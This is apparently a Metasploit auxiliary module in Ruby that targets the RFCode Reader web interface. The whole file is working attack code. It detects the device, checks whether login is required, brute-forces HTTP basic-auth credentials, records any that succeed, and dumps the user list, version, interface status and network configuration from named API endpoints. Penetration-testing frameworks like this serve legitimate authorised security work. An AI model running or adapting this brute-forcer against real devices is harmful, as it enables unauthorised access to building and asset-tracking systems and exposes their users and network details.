##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'RFCode Reader Web interface Login Utility',
			'Description'    => %{
				This module simply attempts to login to a RFCode Reader web interface. Please note that
				by default there is no authentication. In such a case, password brute force will not be performed. 
				If there is authentication configured, the module will attempt to find valid login credentials and 
        			capture device information.
			},
			'Author'         =>
				[
					'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
				],
			'Version'	 => '1.0',
			'License'	 => MSF_LICENSE

		))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('STOP_ON_SUCCESS', [true, 'Stop guessing when a credential works for a host', true])
			], self.class)

	end

	#
	# Info-Only
	# Identify logged in user: /rfcode_reader/api/whoami.json?_dc=1369680704481
	# Capture list of users: /rfcode_reader/api/userlist.json?_dc=1370353972710
	# Interface configuration: /rfcode_reader/api/interfacestatus.json?_dc=1369678668067
	# Network configuration: /rfcode_reader/api/netconfigstatus.json?_dc=1369678669208
	#

	def run_host(ip)
		unless is_app_rfreader?
			print_error("Application does not appear to be RFCode Reader. Module will not continue.")
			return
		end

		print_status("Checking if authentication is required...")
		unless is_auth_required?
			print_warning("Application does not require authentication.")
			user = ''
			pass = ''

			# Collect device platform & configuration info
			collect_info(user, pass)
			return
		end

		print_status("Brute-forcing...")
		each_user_pass do |user, pass|
			do_login(user, pass)
		end
	end

	#
	# What's the point of running this module if the app actually isn't RFCode Reader?
	#
	def is_app_rfreader?
		res = send_request_raw({'uri' => '/rfcode_reader/api/whoami.json?_dc=1369680704481'})
		return (res and res.code != 404)
	end

	#
	# The default install of RFCode Reader app does not require authentication. Instead, it'll log the
	# user right in. If that's the case, no point to brute-force, either.
	#
	def is_auth_required?
		user = ''
		pass = ''

		res = send_request_cgi(
			{
				'uri'       => '/rfcode_reader/api/whoami.json?_dc=1369680704481',
				'method'    => 'GET',
				'authorization' => basic_auth(user,pass)
			})

		return (res and res.body =~ /{  }/) ? false : true
	end

	#
	# Brute-force the login page
	#
	def do_login(user, pass)

		vprint_status("Trying username:'#{user.inspect}' with password:'#{pass.inspect}'")
		begin
			res = send_request_cgi(
			{
				'uri'       => '/rfcode_reader/api/whoami.json?_dc=1369680704481',
				'method'    => 'GET',
				'authorization' => basic_auth(user,pass)
			})

			if not res or res.code == 401
				vprint_error("FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
				return :skip_pass
			else
				print_good("SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")

				collect_info(user, pass)

				report_hash = {
					:host   => datastore['RHOST'],
					:port   => datastore['RPORT'],
					:sname  => 'RFCode Reader',
					:user   => user,
					:pass   => pass,
					:active => true,
					:type => 'password'}

				report_auth_info(report_hash)
				return :next_user
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
			print_error("HTTP Connection Failed, Aborting")
			return :abort
		end
	end

	#
	# Collect target info
	#
	def collect_info(user, pass)

		vprint_status("Collecting information from app as '#{user.inspect}':'#{pass.inspect}'...")
		begin

			res = send_request_cgi(
                        {
                                'uri'       => '/rfcode_reader/api/version.json?_dc=1370460180056',
                                'method'    => 'GET',
                                'authorization' => basic_auth(user,pass)
                        })

                        print_good("Collecting device platform info...")
                        print_good(res.body)

			res = send_request_cgi(
                        {
                                'uri'       => '/rfcode_reader/api/userlist.json?_dc=1370353972710',
                                'method'    => 'GET',
                                'authorization' => basic_auth(user,pass)
                        })

                        print_good("Collecting user list...")
                        print_good(res.body)


			res = send_request_cgi(
			{
				'uri'       => '/rfcode_reader/api/interfacestatus.json?_dc=1369678668067',
				'method'    => 'GET',
				'authorization' => basic_auth(user,pass)
			})

			print_good("Collecting interface info…")
			print_good(res.body)

			res = send_request_cgi(
                        {
                                'uri'       => '/rfcode_reader/api/netconfigstatus.json?_dc=1369678669208',
                                'method'    => 'GET',
                                'authorization' => basic_auth(user,pass)
                        })

                        print_good("Collecting network configuration…")
                        print_good(res.body)


			return
		end
	end
end
